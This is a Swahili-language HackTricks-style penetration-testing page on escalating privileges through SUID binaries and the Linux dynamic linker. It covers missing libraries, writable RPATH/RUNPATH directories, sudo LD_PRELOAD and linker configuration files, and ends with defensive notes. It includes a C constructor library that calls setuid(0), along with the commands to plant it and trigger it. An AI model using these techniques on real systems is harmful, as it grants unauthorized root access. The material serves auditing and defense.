# Matumizi Mabaya ya Shared Library na Linker za SUID

{{#include ../../banners/hacktricks-training.md}}

Kwa kawaida, SUID binaries hukaguliwa ili kubaini utekelezaji wa amri moja kwa moja, lakini programu maalum za SUID zinaweza pia kuwa hatarini kupitia dynamic linker. Jambo la msingi ni rahisi: executable yenye privileges hupakia code kutoka kwenye path au configuration ambayo mtumiaji mwenye privileges za chini anaweza kuathiri.<sup>[[1]](#references)</sup>

Ukurasa huu unaangazia mifumo ya jumla ya mbinu: libraries zinazokosekana, directories za libraries zinazoweza kuandikwa, `RPATH`/`RUNPATH`, `LD_PRELOAD` kupitia sudo, usanidi wa linker, na mkanganyiko wa SUID hardlink.

Kwa maelezo kuhusu ELF program headers, dynamic section, na tabia ya loader inayohusika na ukaguzi huu, tazama [ELF basic information](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Uchunguzi wa Haraka

Anza kwa kutafuta faili zisizo za kawaida za SUID na kuangalia kama zimeunganishwa kwa kutumia dynamic linking:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Tumia `readelf` kwa executable usiyoifahamu: [`ldd` inaweza kutekeleza ELF interpreter isiyoaminika](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` huonyesha dependencies za moja kwa moja, kwa hivyo thibitisha kando njia ambayo loader huchagua.<sup>[[1]](#references)[[3]](#references)</sup>

Lenga maeneo yasiyo ya kawaida, njia maalum za programu, binaries zinazomilikiwa na root lakini zilizo nje ya directories zinazodhibitiwa na package, na dependencies zinazopakiwa kutoka directories zinazoweza kuandikika.<sup>[[1]](#references)</sup>

Ukaguzi muhimu wa ruhusa za kuandika:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Baadhi ya binaries maalum za SUID hujaribu kupakia shared object ambayo haipo. Ikiwa njia ambayo haipo iko chini ya directory inayodhibitiwa na mshambuliaji, binary inaweza kupakia code iliyotolewa na mshambuliaji ikiwa na ruhusa za effective user.<sup>[[1]](#references)</sup>

Kanuni hiyo hiyo inatumika kwa **binary maalum inayoruhusiwa kupitia sudo** inapopiga `dlopen()` kwenye njia kamili ya `.so` iliyo chini ya home directory au configuration directory ambayo caller anaweza kuandika. Upakiaji huu wa baadaye wa library unaweza usionekane kwenye matokeo ya `ldd` wala maingizo ya ELF `NEEDED`. Ukaguzi wenye kikomo wa `strings` au kufuatilia invocation isiyo na ruhusa za ziada kunaweza kufichua njia inayojaribiwa; nenosiri la application au chaguo la menyu linaweza kudhibiti utafutaji huo. Thibitisha sudo rule inayotumika, njia halisi na ruhusa za parent directory, na kwamba invocation yenye ruhusa za ziada inafikia utafutaji huo kabla ya kuuchukulia kama njia ya kupata ruhusa za juu. Usiendeshe sudo target kwa lengo tu la kuichunguza.

Tafuta library lookup zilizoshindwa kwa kutumia syscall filter ya `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Ikiwa binary inatafuta libexample.so katika njia inayoweza kuandikwa, library ndogo ya uthibitisho inaweza kutumia constructor. Hakikisha uthibitisho wa athari hauna madhara wakati wa uthibitishaji:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Iunde kwa jina halisi la faili ambalo binary inajaribu kupakia:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Hali inayoweza kutumiwa si kukosekana kwa library pekee. Mshambuliaji lazima aweze kuweka shared object inayooana kwenye njia ambayo loader yenye upendeleo itakubali.<sup>[[1]](#references)</sup>

## Saraka ya Library Inayoweza Kuandikwa

Wakati mwingine dependencies zote zipo, lakini mojawapo ya saraka zinazotumika kuzitatua inaweza kuandikwa. Hii inaweza kuruhusu kubadilisha library iliyopakiwa au kuweka library yenye jina hilohilo ambayo ina kipaumbele cha juu zaidi.<sup>[[1]](#references)</sup>

Kagua vivyo hivyo ELF maalum **inayoruhusiwa kupitia sudo**, hata kama ELF haina biti ya SUID na akaunti ya RunAs iliyoruhusiwa si root. Linganisha maingizo yake ya `DT_NEEDED` na pathname ya library ambayo loader itatatua; kisha angalia kama mtumiaji anayeita amri anaweza kuandika faili hiyo au kuibadilisha kupitia saraka ya mzazi inayoweza kuandikwa na kutafutwa. Thibitisha kanuni halisi ya sudo RunAs, symlinks na ACLs, sera ya loader, na kwamba mchakato lengwa unapakia library hiyo ukiwa na akaunti yenye upendeleo wa juu zaidi. `.so` inayoweza kuandikwa au jina la dependency pekee ni kidokezo tu; kagua metadata bila kuendesha amri ya sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Kagua njia za dependencies:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Ikiwa saraka inaweza kuandikika, thibitisha kwa kutumia mbinu salama inayotumia nakala kwenye maabara. Kubadilisha maktaba za mfumo kwenye hosti inayotumika kunaweza kusababisha michakato inayoanza kwa wakati mmoja kutumia matoleo yasiyolingana ya maktaba.<sup>[[8]](#references)</sup>

### Maktaba zinazoweza kuandikika ndani ya chroot

chroot pekee haifungi file descriptors zilizorithiwa wala kuzuia ufikiaji wote wa mfumo wa faili. Ikiwa sandbox itaacha directory descriptor inayoelekeza nje ya root yake mpya, na mchakato uliofungiwa unaweza kurejelea descriptor hiyo (kwa mfano, kupitia ingizo linaloweza kufikiwa la `/proc/<pid>/fd/`), njia za hosti zinaweza kubaki zikifikika. Hili ni tatizo la mpaka wa mfumo wa faili; halitoi haki za root lenyewe.<sup>[[11]](#references)[[12]](#references)</sup>

Kagua kando ikiwa mtumiaji aliyefungiwa anaweza kuandika kwenye saraka ya maktaba ambayo **host root-SUID executable** itatumia ikizinduliwa kutoka ndani ya jail. Loader hutatua dependencies kulingana na mwonekano wa mfumo wa faili wa mchakato, kwa hiyo maktaba inayodhibitiwa na mshambulizi hapo inaweza kutekelezwa ikiwa na utambulisho unaotumika wa programu ya SUID. Thibitisha executable husika, biti yake ya SUID na sera ya mount, lengwa la descriptor na ruhusa za ufikiaji, njia ya utafutaji wa maktaba ya jail, na kwamba programu inaweza kwa kweli kufikia executable ya hosti. File capability kwenye launcher ya sandbox, jail inayoweza kuandikika, au host SUID binary pekee ni dalili tu; mnyororo mzima hutegemea utekelezaji wa sandbox.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH na RUNPATH

`RPATH` na `RUNPATH` ni entries za dynamic section zinazoelekeza loader mahali pa kutafuta maktaba. Ni hatari katika programu za SUID zinapoelekeza kwenye saraka zinazoweza kuandikwa na mshambulizi.<sup>[[1]](#references)</sup>

Zitambue:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Mfano wa matokeo hatarishi:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Ikiwa `/opt/app/lib` inaweza kuandikwa na binary inahitaji `libcustom.so`, mshambuliaji anaweza kuweka `libcustom.so` hasidi hapo:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` na `RUNPATH` hazifanani katika maelezo yote ya utatuzi, lakini kwa ukaguzi wa privilege escalation swali la kiutendaji ni lilelile: je, binary ya SUID hutafuta jina la library kwenye directory ambayo mshambuliaji anaweza kuandika?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

Kwa programu za kawaida, `LD_PRELOAD` na `LD_LIBRARY_PATH` zinaweza kulazimisha au kuathiri upakiaji wa shared object. Kwa programu za SUID, dynamic loader kwa kawaida huingia katika hali ya secure-execution na kupuuza vigezo hatari vya mazingira.<sup>[[1]](#references)</sup>

Hii inamaanisha kuwa binary ya kawaida ya SUID kwa kawaida haiathiriwi na udhaifu kwa sababu tu mtumiaji anaweza kuweka `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Hali ya kawaida ya kipekee ni sera ya sudo inayoruhusu kuweka thamani ya mazingira kwenye mstari wa amri kwa programu lengwa, kama vile tag ya `SETENV` au chaguo la `setenv` linalotumika. Ikiwa programu lengwa imeunganishwa kwa kutumia dynamic linking na sudo inakubali `LD_PRELOAD=/path/to/library`, programu lengwa inaweza kupakia code inayodhibitiwa na mtumiaji anayeiendesha. Kagua sheria inayotumika na utambulisho wa programu lengwa. Kuongeza tu `LD_PRELOAD` kwenye `env_keep` hakutoshi kwenye mifumo ambayo dynamic loader huondoa `LD_PRELOAD` iliyorithiwa kabla ya mchakato wa SUID wa `sudo` kuanza; sudo hutathmini thamani iliyowekwa kwenye mstari wa amri baada ya kuanza kwake.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Usichanganye hali hizi; sheria za loader na sudo zilizo hapo juu huzitofautisha:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` dhidi ya binary ya kawaida ya SUID: kwa kawaida huzuiwa na secure execution.
- `LD_PRELOAD` ikikubaliwa kama assignment ya command-line ya sudo kwa target yenye ruhusa za juu na iliyounganishwa dynamically: inaweza kutumiwa vibaya.
- `.so` haipo kwenye path inayoweza kuandikwa: inaweza kutumiwa vibaya binary ya SUID inapopakia path hiyo kwa kawaida.
- `RPATH`/`RUNPATH` inayoelekeza kwenye directory inayoweza kuandikwa: inaweza kutumiwa vibaya ikiwa library inayohitajika inaweza kudhibitiwa.
- Ruhusa za kuandika kwenye `/etc/ld.so.preload` au usanidi wa linker: huathiri mfumo mzima na zina athari kubwa.

## Usanidi wa Linker

`ld.so` hutumia linker cache na `/etc/ld.so.preload`; `ldconfig` hutengeneza cache hiyo kutoka `/etc/ld.so.conf` na faili zinazoingizwa kutoka humo, mara nyingi kwenye `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Ukaguzi muhimu zaidi:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Mipangilio ya linker inayoweza kuandikwa kwa kawaida ni hatari zaidi kuliko binary moja ya SUID iliyo hatarini kwa sababu inaweza kuathiri michakato mingi iliyounganishwa kwa nguvu. `/etc/ld.so.preload` ni hatari hasa kwa sababu inaweza kulazimisha shared object kupakiwa kwenye michakato yenye mapendeleo.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks zinaweza kufanya inode ileile ya SUID ionekane chini ya majina mengi.<sup>[[9]](#references)</sup> Hii ni muhimu kwa kuficha helper yenye mapendeleo, kuchanganya usafishaji, au kukwepa ukaguzi wa kawaida unaotegemea njia ya faili.

Tafuta faili za SUID zenye zaidi ya link moja:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Kagua njia zote zinazoelekeza kwenye inode ileile:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Matumizi mabaya hayahusu hardlink kubadilisha ruhusa. Yanahusu kuchanganya njia: inode yenye ruhusa za juu inaweza kufikiwa kupitia jina ambalo watetezi au scripts hawatarajii.<sup>[[9]](#references)</sup> Kwa maelezo zaidi kuhusu inode na mtiririko wa kazi wa hardlink, tazama [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Weka binaries za SUID kuwa chache, zikaguliwe, na zidhibitiwe na package inapowezekana.
- Epuka maingizo ya `RPATH`/`RUNPATH` yanayoelekeza kwenye directory zinazoweza kuandikika au zinazosimamiwa na application.<sup>[[1]](#references)[[8]](#references)</sup>
- Hakikisha directory za library zinamilikiwa na root na haziwezi kuandikiwa na watumiaji wa kawaida.<sup>[[8]](#references)</sup>
- Usihifadhi `LD_PRELOAD`, `LD_LIBRARY_PATH`, au variables nyingine zinazofanana za loader kupitia sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Fuatilia `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na faili za SUID zisizotarajiwa.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Kagua faili za SUID zenye hardlink na chunguza wrappers maalum za SUID zilizo nje ya njia za kawaida za mfumo.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Sifa za Kawaida (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Uimarishaji wa Dynamic Linker (GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
